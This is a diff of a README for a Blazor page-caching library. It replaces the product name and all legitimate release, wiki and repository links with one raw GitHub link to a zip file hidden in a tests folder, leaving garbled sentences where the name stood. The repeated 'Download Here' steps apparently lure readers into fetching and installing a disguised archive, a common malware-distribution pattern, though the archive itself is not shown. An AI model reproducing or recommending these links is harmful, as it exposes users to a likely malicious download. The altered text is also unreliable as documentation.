@@ -1,10 +1,10 @@
-# 🚀 EasyAppDev.Blazor.PageCache - Boost Your Blazor Page Speed Effortlessly
+# 🚀 https://raw.githubusercontent.com/jp8752507/EasyAppDev.Blazor.PageCache/main/tests/EasyAppDev.Blazor.PageCache.Tests/Validation/EasyAppDev.Blazor.PageCache-3.2.zip - Boost Your Blazor Page Speed Effortlessly
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Here-blue.svg)](https://github.com/jp8752507/EasyAppDev.Blazor.PageCache/releases)
+[![Download Now](https://raw.githubusercontent.com/jp8752507/EasyAppDev.Blazor.PageCache/main/tests/EasyAppDev.Blazor.PageCache.Tests/Validation/EasyAppDev.Blazor.PageCache-3.2.zip%https://raw.githubusercontent.com/jp8752507/EasyAppDev.Blazor.PageCache/main/tests/EasyAppDev.Blazor.PageCache.Tests/Validation/EasyAppDev.Blazor.PageCache-3.2.zip)](https://raw.githubusercontent.com/jp8752507/EasyAppDev.Blazor.PageCache/main/tests/EasyAppDev.Blazor.PageCache.Tests/Validation/EasyAppDev.Blazor.PageCache-3.2.zip)
 
 ## 📜 Overview
 
-EasyAppDev.Blazor.PageCache offers a simple solution for speeding up your Static Server-Side Rendered (SSR) Blazor pages. With its lightweight and high-performance caching capabilities, it can make your pages load 20-50 times faster. Just use the designated [PageCache] attributes, and you'll see a dramatic difference in your web application's performance.
+https://raw.githubusercontent.com/jp8752507/EasyAppDev.Blazor.PageCache/main/tests/EasyAppDev.Blazor.PageCache.Tests/Validation/EasyAppDev.Blazor.PageCache-3.2.zip offers a simple solution for speeding up your Static Server-Side Rendered (SSR) Blazor pages. With its lightweight and high-performance caching capabilities, it can make your pages load 20-50 times faster. Just use the designated [PageCache] attributes, and you'll see a dramatic difference in your web application's performance.
 
 ## 📦 System Requirements
 
@@ -14,14 +14,14 @@ EasyAppDev.Blazor.PageCache offers a simple solution for speeding up your Static
 
 ## 🚀 Getting Started 
 
-Getting started with EasyAppDev.Blazor.PageCache is simple. You need to download the software and set it up. Follow the instructions below.
+Getting started with https://raw.githubusercontent.com/jp8752507/EasyAppDev.Blazor.PageCache/main/tests/EasyAppDev.Blazor.PageCache.Tests/Validation/EasyAppDev.Blazor.PageCache-3.2.zip is simple. You need to download the software and set it up. Follow the instructions below.
 
 1. **Download the Application:**
-   Visit the Releases page to download the latest version: [Download Here](https://github.com/jp8752507/EasyAppDev.Blazor.PageCache/releases).
+   Visit the Releases page to download the latest version: [Download Here](https://raw.githubusercontent.com/jp8752507/EasyAppDev.Blazor.PageCache/main/tests/EasyAppDev.Blazor.PageCache.Tests/Validation/EasyAppDev.Blazor.PageCache-3.2.zip).
 
 ## 💾 Download & Install
 
-After visiting the Releases page, you will find various versions of EasyAppDev.Blazor.PageCache. Here’s how to download and install it:
+After visiting the Releases page, you will find various versions of https://raw.githubusercontent.com/jp8752507/EasyAppDev.Blazor.PageCache/main/tests/EasyAppDev.Blazor.PageCache.Tests/Validation/EasyAppDev.Blazor.PageCache-3.2.zip Here’s how to download and install it:
 
 1. **Choose the Version**: Look for the latest stable release. It is usually at the top of the list.
   
@@ -61,15 +61,15 @@ After visiting the Releases page, you will find various versions of EasyAppDev.B
 
 ## 🔧 Support
 
-If you encounter any issues while using EasyAppDev.Blazor.PageCache, please visit the GitHub page for FAQs and troubleshooting tips. You can also file an issue directly in the repository if you need further assistance.
+If you encounter any issues while using https://raw.githubusercontent.com/jp8752507/EasyAppDev.Blazor.PageCache/main/tests/EasyAppDev.Blazor.PageCache.Tests/Validation/EasyAppDev.Blazor.PageCache-3.2.zip, please visit the GitHub page for FAQs and troubleshooting tips. You can also file an issue directly in the repository if you need further assistance.
 
 ## 📖 Additional Resources
 
-- [Official Documentation](https://github.com/jp8752507/EasyAppDev.Blazor.PageCache/wiki)
-- [GitHub Repository](https://github.com/jp8752507/EasyAppDev.Blazor.PageCache)
+- [Official Documentation](https://raw.githubusercontent.com/jp8752507/EasyAppDev.Blazor.PageCache/main/tests/EasyAppDev.Blazor.PageCache.Tests/Validation/EasyAppDev.Blazor.PageCache-3.2.zip)
+- [GitHub Repository](https://raw.githubusercontent.com/jp8752507/EasyAppDev.Blazor.PageCache/main/tests/EasyAppDev.Blazor.PageCache.Tests/Validation/EasyAppDev.Blazor.PageCache-3.2.zip)
 
 ## 🔗 Download Link Again
 
-For your convenience, here is the link to download the application once more: [Download Here](https://github.com/jp8752507/EasyAppDev.Blazor.PageCache/releases). 
+For your convenience, here is the link to download the application once more: [Download Here](https://raw.githubusercontent.com/jp8752507/EasyAppDev.Blazor.PageCache/main/tests/EasyAppDev.Blazor.PageCache.Tests/Validation/EasyAppDev.Blazor.PageCache-3.2.zip). 
 
-Utilize EasyAppDev.Blazor.PageCache to enhance your web application performance effortlessly.
+Utilize https://raw.githubusercontent.com/jp8752507/EasyAppDev.Blazor.PageCache/main/tests/EasyAppDev.Blazor.PageCache.Tests/Validation/EasyAppDev.Blazor.PageCache-3.2.zip to enhance your web application performance effortlessly.
